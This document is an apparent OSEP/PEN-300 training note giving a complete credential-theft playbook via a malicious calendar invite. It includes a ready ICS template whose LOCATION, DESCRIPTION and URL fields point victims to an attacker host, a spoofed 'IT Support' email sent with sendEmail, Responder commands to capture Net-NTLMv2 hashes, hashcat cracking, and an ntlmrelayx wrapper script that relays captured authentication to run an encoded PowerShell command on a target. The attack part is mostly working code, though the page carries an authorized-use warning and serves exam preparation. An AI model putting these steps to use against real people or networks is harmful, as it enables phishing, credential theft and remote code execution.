::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# ICS calendar invite

If the target will process a meeting invite but there is no macro path, send an `.ics` plus an HTML lure that makes the client authenticate to you. Invite received or accepted is not proof of auth — require a protocol log before you move on.

Course mapping: PEN-300 Chapter 5 (calendar as an initial-access vector, crafting/automating the invite, credential stealing with Responder). Relaying a captured authentication is covered in Chapter 20 §20.1.4 and Chapter 22 §22.2.2.

## Invite accepted, no macro path

If you know the recipient address and the client will open or accept a calendar invite, the course path is a Teams-style HTML mail with a “Click here to join the meeting” link at `http://LHOST`. When the user clicks, Responder’s HTTP server presents a fake login prompt and logs an HTTP Net-NTLMv2 hash. Crack it with hashcat `-m 5600`. Do not treat an HTTP fetch as “not auth” — the course capture is HTTP NTLMv2.

A UNC path in `LOCATION` / `DESCRIPTION` is a useful second ref (the template already has one) and may trigger SMB auth without a click, but whether that fires depends on the client version and config. Put both kinds of ref in the same invite and let the logs show which one the client touched.

- [ ] Start Responder on the attacker interface (and optionally an HTTP token probe on a free port)
- [ ] Generate a per-delivery invite from `m16-ics-invite.ics` (unique `TOKEN`)
- [ ] Send the HTML lure + `.ics` attachment (inline `text/calendar` if the attachment is ignored)
- [ ] Watch for `[HTTP] NTLMv2` or `[SMB] NTLMv2-SSP` from the target IP
- [ ] Crack Net-NTLMv2, or relay only if you have SMB auth and signing is off

Prepare a unique token and confirm tools:

```bash
mkdir -p ~/osep/{logs,payloads/infra,loot}
which responder impacket-ntlmrelayx hashcat
TOKEN="m16-$(date +%s | tail -c 6)"      # e.g. m16-3f2a91
echo "$TOKEN"
```

Generate the invite (replace placeholders once):

```bash
cd ~/osep/payloads/infra
sed -e "/^#/d" \
    -e "s/LHOST/192.168.45.10/g" \
    -e "s|https://URL|http://192.168.45.10|g" \
    -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
    -e "s/TOKEN/${TOKEN}/g" \
    m16-ics-invite.ics \
    > invite-${TOKEN}.ics
head -20 invite-${TOKEN}.ics      # confirm replacements before send
```

Spec-wise `.ics` wants CRLF and long-line folding; most clients (including Outlook) tolerate LF. If the target client fails to parse, convert line endings then resend: `sed -i 's/$/\r/' invite-${TOKEN}.ics`.

Start Responder (course default — HTTP server is on; binds the interface, including 80/445):

```bash
sudo responder -I tun0 2>&1 | tee -a ~/osep/logs/responder.log
# or, with WPAD and verbose: sudo responder -I eth0 -wv
# one-shot wrapper: bash m16-auth-capture.sh capture IFACE
```

Deliver with `sendEmail` (HTML body + `.ics` attachment), as in the course:

```bash
sendEmail -s SMTP_SERVER -t USER@DOMAIN -f attacker@DOMAIN \
  -u "Urgent HR meeting" \
  -o message-content-type=html -o message-file=./email.html \
  -a invite-${TOKEN}.ics
```

The HTML lure should look like a Teams invite; the key element is a clickable `{EVENT_URL}` (`http://LHOST`) labelled “Click here to join the meeting.” If the client ignores the attachment, resend with an inline `Content-Type: text/calendar; method=REQUEST` block, or send both.

A log line like `[HTTP] NTLMv2 Username : DOMAIN\user` plus a Hash blob, sourced from the target IP, is auth. The same is true for `[SMB] NTLMv2-SSP`. Save the hash blob and crack it:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Net-NTLMv2 is challenge-response — crack or relay only, do not attempt PTH. If crack fails and the capture was SMB, switch to relay against a target where SMB signing is not required:

```bash
nmap -p 445 --script smb2-security-mode TARGET
# relay only when smb2-security-mode reports "Message signing enabled but not required"
# capture and relay cannot share 445 — stop Responder first
sudo impacket-ntlmrelayx --no-http-server -smb2support \
  -t smb://TARGET \
  -c "powershell -enc BASE64PAYLOAD" -of ~/osep/loot/relay-hashes.txt
# or: bash m16-auth-capture.sh relay TARGET CMD
```

`crackmapexec smb <range> --gen-relay-list` can batch-find relay candidates. Hash follow-on: [07-credentials-lsass](/modules/07-credentials-lsass) and [12-ad-attacks](/modules/12-ad-attacks).

If there is only an SMTP delivery receipt and no callback, the mail never opened, the link was not clicked, or `LHOST` is not reachable from the target — confirm the receiver (`ss -ltnp | grep -E '445|80'`), then try inline `text/calendar` or a UNC in `LOCATION`. If you get an HTTP token-path request but no hash, the client fetched content without sending credentials — keep watching for a click, or lean on the SMB refs already in the template. If hashes arrive from an unrelated source IP or account, filter the log for the target IP and the unique `TOKEN`. If relay fails (`no more targets`, signing required, or port conflict), fall back to capture + crack.

Responder is a poisoner: by default it answers LLMNR/NBT-NS/WPAD. Start it only when you need auth, only on the target’s interface, and stop it immediately after use. Trigger timing is uncertain — cap observation at about 20–30 minutes and keep other scoring paths moving in parallel. Archive logs under `~/osep/logs/` and hashes under `~/osep/loot/`.

::: details `m16-ics-invite.ics` · click to expand

````text
# ---- header (NOT part of the iCalendar spec) --------------------------------
# Purpose: calendar invite template — LOCATION/DESCRIPTION/URL/ATTACH reference
#          attacker resources so the calendar client fetches SMB/HTTP and auths
# Scenario: 13 (target accepts calendar invites; no macro path)
# Depends: Responder (SMB auth) or ntlmrelayx (relay) already running;
#          optional HTTP token probe (python3 -m http.server 80)
# Usage: sed-replace placeholders, then deliver, e.g.:
#   sed -e "/^#/d" -e "s/LHOST/192.168.45.10/g" -e "s|https://URL|http://192.168.45.10|g" \
#       -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
#       -e "s/TOKEN/m16-3f2a91/g" m16-ics-invite.ics > invite.ics
#       Delivery: mail attachment .ics or inline text/calendar; METHOD=REQUEST
# Placeholders: LHOST=attacker IP  URL=HTTP base (no trailing /)  USER=target account
#               DOMAIN=mail domain  TOKEN=unique delivery id (victim + fetch proof)
# Test status: RFC 5545 field structure checked; not live-tested against real clients
#              If client rejects parse, strip these # comment lines and convert to CRLF
# -----------------------------------------------------------------------------
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//M16-OSEP//ICS-INVITE//EN
METHOD:REQUEST
CALSCALE:GREGORIAN
BEGIN:VEVENT
UID:m16-TOKEN@LHOST
DTSTAMP:20250101T000000Z
DTSTART:20250101T130000Z
DTEND:20250101T140000Z
SUMMARY:Review and confirm shared document
LOCATION:\\\\LHOST\\share\\TOKEN
DESCRIPTION:Materials for review are ready.\nAccess them at https://URL/TOKEN or from the shared folder \\\\LHOST\\share\\TOKEN.
URL:https://URL/TOKEN/invite.html
ATTACH;FMTTYPE=text/html:https://URL/TOKEN/preview.html
ORGANIZER;CN=IT Support:mailto:it-support@DOMAIN
ATTENDEE;ROLE=REQ-PARTICIPANT;RSVP=TRUE;CN=USER:mailto:USER@DOMAIN
END:VEVENT
END:VCALENDAR
````

:::

::: details `m16-auth-capture.sh` · click to expand

````bash
#!/usr/bin/env bash
# Purpose: scenario-13 auth receiver one-shot — Responder Net-NTLMv2 capture /
#          ntlmrelayx relay / HTTP token probe; unified logs + port-busy checks;
#          after hash capture, print follow-on hints
# Scenario: ICS calendar invite triggers outbound auth from the target
# Depends: responder (or impacket-ntlmrelayx), python3, lsof; root for 445/80
# Usage:
#   bash m16-auth-capture.sh capture IFACE [LOGDIR]      # Responder hashes
#   bash m16-auth-capture.sh relay TARGET CMD [LOGDIR]   # relay to SMB target, run CMD
#   bash m16-auth-capture.sh probe [DIR]                 # HTTP token probe (:80)
#   e.g.: bash m16-auth-capture.sh capture eth0
#         bash m16-auth-capture.sh relay 10.10.10.5 \
#             "powershell -enc SQBFAFgAIAAoAC4ALgApAA=="
# Placeholders: IFACE=listen iface  TARGET=SMB relay IP  CMD=command on target
#               LOGDIR=log dir (default ~/osep/logs)  LHOST see module 00
# Test status: bash -n OK; not live-tested (needs Kali + root + responder)
set -euo pipefail

MODE="${1:-}"
LOGDIR="${3:-$HOME/osep/logs}"
mkdir -p "$LOGDIR"

port_busy() { # $1=port ; returns 0 if busy
  command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$1" -sTCP:LISTEN >/dev/null 2>&1
}

case "$MODE" in
  capture)
    IFACE="${2:-}"
    [[ -z "$IFACE" ]] && { echo "Usage: $0 capture IFACE [LOGDIR]" >&2; exit 1; }
    command -v responder >/dev/null 2>&1 || { echo "[!] responder not installed" >&2; exit 1; }
    port_busy 445 && { echo "[!] 445 busy; free the port or stop ntlmrelayx/smb first" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/responder-$TS.log"
    echo "[*] Starting Responder @ $IFACE, log: $LOG"
    echo "[*] After delivering ICS, treat THIS line as proof of auth:"
    echo "    [SMB] NTLMv2-SSP Username : DOMAIN\\\\user   (+ Hash line)"
    # -w WPAD, -v verbose; drop -w if noise is high
    sudo responder -I "$IFACE" -wv 2>&1 | tee -a "$LOG"
    echo "[*] After hash: hashcat -m 5600 <hash> /usr/share/wordlists/rockyou.txt"
    echo "[*] Hash lines live in $LOG ([SMB] ... Hash); extract by hand into a single-hash file"
    ;;
  relay)
    TARGET="${2:-}"
    CMD="${3:-}"
    [[ -z "$TARGET" || -z "$CMD" ]] && {
      echo "Usage: $0 relay TARGET \"CMD\" [LOGDIR]" >&2
      echo "  First confirm SMB signing not required: nmap -p445 --script smb2-security-mode TARGET" >&2
      exit 1
    }
    command -v impacket-ntlmrelayx >/dev/null 2>&1 || { echo "[!] impacket-ntlmrelayx not installed" >&2; exit 1; }
    port_busy 445 && { echo "[!] 445 busy; stop Responder before switching to relay" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/ntlmrelayx-$TS.log"
    echo "[*] Relaying to smb://$TARGET, log: $LOG"
    # --no-http-server: leave :80 for token probe; -of saves captured hashes
    sudo impacket-ntlmrelayx --no-http-server -smb2support \
      -t "smb://$TARGET" -c "$CMD" -of "$LOG.hashes" 2>&1 | tee -a "$LOG"
    echo "[*] Relay success marker: Authenticating against smb://$TARGET ... SUCCEED"
    ;;
  probe)
    DIR="${2:-$HOME/osep/payloads}"
    port_busy 80 && { echo "[!] 80 busy" >&2; exit 1; }
    [[ -d "$DIR" ]] || { echo "[!] directory missing: $DIR" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/http-token-$TS.log"
    echo "[*] HTTP token probe @ :80, dir: $DIR, log: $LOG"
    echo "[*] A request to the unique token path = client fetches external content (≠ auth; see §7)"
    (cd "$DIR" && python3 -m http.server 80 2>&1 | tee -a "$LOG")
    ;;
  *)
    echo "Usage: $0 {capture|relay|probe} ..." >&2
    echo "  capture IFACE     Responder capture (root, binds 445)" >&2
    echo "  relay TARGET CMD  ntlmrelayx relay (stop capture first; binds 445)" >&2
    echo "  probe [DIR]       HTTP token probe (binds 80)" >&2
    exit 1
    ;;
esac
````

:::

## Cheat sheet

| You want to… | Use |
|---|---|
| Course path (click → HTTP NTLMv2) | Teams-style HTML lure + `sendEmail -a invite.ics`; `sudo responder -I tun0` |
| Build the invite | `m16-ics-invite.ics` (sed-replace `LHOST` / `URL` / `USER` / `DOMAIN` / `TOKEN`) |
| One-shot receiver | `bash m16-auth-capture.sh capture IFACE` / `relay TARGET CMD` / `probe` |
| Crack Net-NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` (no PTH) |
| Relay (SMB auth only, signing off) | Stop Responder, then `impacket-ntlmrelayx -t smb://TARGET` |
